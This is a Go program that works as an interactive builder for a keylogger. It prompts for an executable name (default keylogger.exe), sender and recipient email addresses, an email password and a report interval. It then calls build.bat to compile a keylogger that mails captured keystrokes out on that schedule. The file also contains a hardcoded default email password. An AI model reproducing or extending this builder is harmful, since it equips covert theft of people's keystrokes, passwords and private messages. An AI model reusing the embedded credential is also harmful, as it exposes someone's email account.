package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
)

func main() {
	var executableFileName string
	var emailFrom string
	var emailTo string
	var emailPassword string
	var reportInterval string

	for {
		fmt.Print("\nExecutable file name (default keylogger.exe): ")
		fmt.Scanln(&executableFileName)
		fmt.Print("Email to send report to: ")
		fmt.Scanln(&emailTo)
		fmt.Print("Email to send report From (default set to destination email): ")
		fmt.Scanln(&emailFrom)
		fmt.Print("Email password: ")
		fmt.Scanln(&emailPassword)
		fmt.Print("Interval to send report (s=seconds m=minutes h=hours d=days) (default 30s): ")
		fmt.Scanln(&reportInterval)

		if executableFileName == "" {
			executableFileName = "keylogger.exe"
		}
		if emailFrom == "" {
			emailFrom = emailTo
		}
		if reportInterval == "" {
			reportInterval = "30s"
		}
		if emailPassword == "" {
			emailPassword = "irnsypcfndfpqrtd"
		}

		fmt.Println("\n\nOptions result:")
		fmt.Println("-----------------")
		fmt.Printf("File name:               %s\n", executableFileName)
		fmt.Printf("Send to:                 %s\n", emailTo)
		fmt.Printf("Send from:               %s\n", emailFrom)
		fmt.Printf("Email password:          %s\n", emailPassword)
		fmt.Printf("Email report interverl:  %s\n\n", reportInterval)

		var proceedOption string
		var proceed bool

		for {
			fmt.Print("Proceed to build (Y) or redo option (n)? ")
			fmt.Scanln(&proceedOption)

			if proceedOption == "y" || proceedOption == "Y" || proceedOption == "" {
				proceed = true
				break
			} else if proceedOption == "N" || proceedOption == "n" {
				proceed = false
				break
			} else {
				continue
			}
		}

		if proceed {
			break
		} else {
			continue
		}
	}

	path, err := os.Getwd()
	fmt.Println(path)
	if err != nil {
		log.Println(err)
	}
	sourceLocation := path + "/../src"
	outputExe := path + "/../bin/" + executableFileName

	cmd := exec.Command(
		"build.bat",
		emailFrom,
		emailTo,
		emailPassword,
		reportInterval,
		sourceLocation,
		outputExe,
	)
	out, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Printf("%s\n", err)
	}

	fmt.Println(string(out))

	fmt.Printf("Executable save to ./bin/keylogger.exe\n\n")
}
